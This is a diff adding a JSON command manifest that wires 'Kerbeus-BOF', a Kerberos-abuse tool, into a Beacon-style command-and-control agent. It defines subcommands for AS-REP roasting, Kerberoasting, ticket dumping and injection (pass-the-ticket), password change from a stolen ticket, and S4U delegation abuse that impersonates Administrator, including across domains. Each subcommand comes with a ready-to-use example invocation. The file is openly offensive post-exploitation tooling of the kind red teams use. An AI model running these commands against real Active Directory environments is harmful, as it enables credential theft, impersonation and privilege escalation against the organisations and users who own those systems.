@@ -1,0 +1,176 @@
+{
+  "name": "Kerbeus-BOF",
+  "description": "BOF for Kerberos abuse",
+  "extensions": [
+    {
+      "type": "command",
+      "agents": ["beacon"],
+
+      "command": "kerbeus",
+      "description": "Kerberos abuse (kerbeus BOF)",
+      "subcommands":
+      [
+        {
+          "name": "asreproasting",
+          "message": "Task: Kerbeus ASREPROASTING",
+          "description": "Perform AS-REP roasting",
+          "example": "kerbeus asreproasting /user:pre_user",
+          "args": [
+            "STRING <params> {Args: /user:USER [/dc:DC] [/domain:DOMAIN]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/asreproasting.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "asktgt",
+          "message": "Task: Kerbeus ASKTGT",
+          "description": "Retrieve a TGT",
+          "example": "kerbeus asktgt /user:Admin /password:QWErty /enctype:aes256 /opsec /ptt",
+          "args": [
+            "STRING <params> {Args: /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:(rc4|aes256)] [/ptt] [/nopac] [/opsec]\n                              /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n                              /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n                              /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/asktgt.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "asktgs",
+          "message": "Task: Kerbeus ASKTGS",
+          "description": "Retrieve a TGS",
+          "example": "kerbeus asktgs /service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:(rc4|aes256)] [/ptt] [/keylist] [/u2u] [/opsec]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/asktgs.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "changepw",
+          "message": "Task: Kerbeus CHANGEPW",
+          "description": "Reset a user's password from a supplied TGT",
+          "example": "kerbeus changepw /new:New_P4ss /ticket:doIF8DCCBey...",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/changepw.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "describe",
+          "message": "Task: Kerbeus DESCRIBE",
+          "description": "Parse and describe a ticket",
+          "example": "kerbeus describe /ticket:doIF8DCCBey...",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/describe.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "dump",
+          "message": "Task: Kerbeus DUMP",
+          "description": "Dump tickets",
+          "example": "kerbeus dump",
+          "args": [
+            "STRING [params] {Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/dump.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "hash",
+          "message": "Task: Kerbeus HASH",
+          "description": "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes",
+          "example": "kerbeus hash /password:!Q@W3e4r",
+          "args": [
+            "STRING <params> {Args: /password:PASSWORD [/user:USER] [/domain:DOMAIN]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/hash.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "kerberoasting",
+          "message": "Task: Kerbeus KERBEROASTING",
+          "description": "Perform Kerberoasting",
+          "example": "kerbeus kerberoasting /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...",
+          "args": [
+            "STRING <params> {Args: /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n                              /spn:SPN /ticket:BASE64 [/dc:DC]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/kerberoasting.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "klist",
+          "message": "Task: Kerbeus KLIST",
+          "description": "List tickets",
+          "example": "kerbeus klist /luid:3ea8",
+          "args": [
+            "STRING [params] {Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/klist.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "ptt",
+          "message": "Task: Kerbeus PTT",
+          "description": "Submit a TGT",
+          "example": "kerbeus ptt /ticket:doIF8DCCBey...",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64 [/luid:LOGONID]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/ptt.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "purge",
+          "message": "Task: Kerbeus PURGE",
+          "description": "Purge tickets",
+          "example": "kerbeus purge /luid:3ea8",
+          "args": [
+            "STRING [params] {Args: [/luid:LOGONID]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/purge.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "renew",
+          "message": "Task: Kerbeus RENEW",
+          "description": "Renew a TGT",
+          "example": "kerbeus renew /ticket:doIF8DCCBey...",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64 [/dc:DC] [/ptt]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/renew.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "s4u",
+          "message": "Task: Kerbeus S4U",
+          "description": "Perform S4U constrained delegation abuse",
+          "example": "kerbeus s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /service:host/comp.domain.local /altservice:http,cifs",
+          "args": [
+            "STRING <params> {Args: /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/s4u.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "cross_s4u",
+          "message": "Task: Kerbeus CROSS_S4U",
+          "description": "Perform S4U constrained delegation abuse across domains",
+          "example": "kerbeus cross_s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /targetdomain:sdomain.local /targetdc:dc.sdomain.local /service:host/comp.sdomain.local /altservice:http,cifs",
+          "args": [
+            "STRING <params> {Args: krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/cross_s4u.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "tgtdeleg",
+          "message": "Task: Kerbeus TGTDELEG",
+          "description": "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API",
+          "example": "kerbeus tgtdeleg",
+          "args": [
+            "STRING [params] {Args: [/target:SPN]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/tgtdeleg.$ARCH().o $PACK_BOF(CSTR {params})"
+        },
+        {
+          "name": "triage",
+          "message": "Task: Kerbeus TRIAGE",
+          "description": "List tickets in table format",
+          "example": "kerbeus triage /luid:3ea8",
+          "args": [
+            "STRING [params] {Args: [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/triage.$ARCH().o $PACK_BOF(CSTR {params})"
+        }
+      ]
+    }
+  ]
+}
